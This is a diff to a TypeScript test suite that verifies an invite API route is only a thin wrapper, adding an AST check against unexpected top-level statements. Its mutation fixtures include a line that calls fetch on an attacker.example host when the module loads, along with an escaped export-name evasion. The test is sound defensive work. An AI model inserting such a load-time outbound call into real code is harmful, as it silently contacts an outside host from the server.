@@ -544,6 +544,34 @@ function routeDelegationIssues(code: string): string[] {
   );
   if (!post?.body) return [...issues, "missing_direct_post_body"];
 
+  const routeConfigNames = new Set([
+    "runtime",
+    "dynamic",
+    "dynamicParams",
+    "revalidate",
+    "fetchCache",
+    "preferredRegion",
+    "maxDuration",
+  ]);
+  let configStatements = 0;
+  for (const statement of file.statements) {
+    if (statement === post) continue;
+    if (ts.isImportDeclaration(statement) && statement.importClause !== undefined) continue;
+    if (
+      ts.isVariableStatement(statement) &&
+      hasExportModifier(statement) &&
+      (statement.declarationList.flags & ts.NodeFlags.Const) !== 0 &&
+      statement.declarationList.declarations.length === 1
+    ) {
+      const declaration = statement.declarationList.declarations[0];
+      if (declaration !== undefined && ts.isIdentifier(declaration.name) && routeConfigNames.has(declaration.name.text)) {
+        configStatements += 1;
+        if (configStatements <= 1) continue;
+      }
+    }
+    issues.push("unexpected_top_level_statement");
+  }
+
   const parameter = post.parameters[0];
   if (post.parameters.length !== 1 || parameter === undefined || !ts.isIdentifier(parameter.name) || parameter.name.text !== "request") {
     issues.push("post_does_not_take_request");
@@ -632,6 +660,21 @@ describe("app/api/invite/route.ts is a wrapper around handleInviteRequest and no
 
   test("POST is structurally one exact delegation, with no shadow and no additional call side effect", () => {
     assert.deepEqual(routeDelegationIssues(readFileSync(join(WEB_ROOT, ROUTE), "utf8")), []);
+  });
+
+  test("RED-BEFORE: module-load side effects are outside POST and still fail the wrapper allowlist", () => {
+    const raw = readFileSync(join(WEB_ROOT, ROUTE), "utf8");
+    const mutants: Record<string, string> = {
+      "top-level fetch": `${raw}\nvoid fetch("https://attacker.example/observe");\n`,
+      "top-level console call": `${raw}\nconsole.log("route loaded");\n`,
+      "side-effect-only import": `import "@/lib/observe-route-load";\n${raw}`,
+    };
+    for (const [shape, mutant] of Object.entries(mutants)) {
+      assert.ok(
+        routeDelegationIssues(mutant).includes("unexpected_top_level_statement"),
+        `${shape} ran outside POST but the route wrapper pin did not refuse it`,
+      );
+    }
   });
 
   test("RED-BEFORE: an import from the WRONG MODULE fails identity even when every spelling matches", () => {
@@ -723,6 +766,7 @@ describe("app/api/invite/route.ts is a wrapper around handleInviteRequest and no
     const shapes: Record<string, string> = {
       "aliased export clause": "\nasync function rawGet(): Promise<Response> { return new Response(null); }\nexport { rawGet as GET };\n",
       "quoted aliased export clause": '\nasync function rawGet(): Promise<Response> { return new Response(null); }\nexport { rawGet as "GET" };\n',
+      "escaped quoted aliased export clause": '\nasync function rawGet(): Promise<Response> { return new Response(null); }\nexport { rawGet as "G\\u0045T" };\n',
       "export let": "\nexport let GET = async (): Promise<Response> => new Response(null);\n",
       "export var": "\nexport var GET = async (): Promise<Response> => new Response(null);\n",
       "plain function": "\nexport async function GET(): Promise<Response> { return new Response(null); }\n",
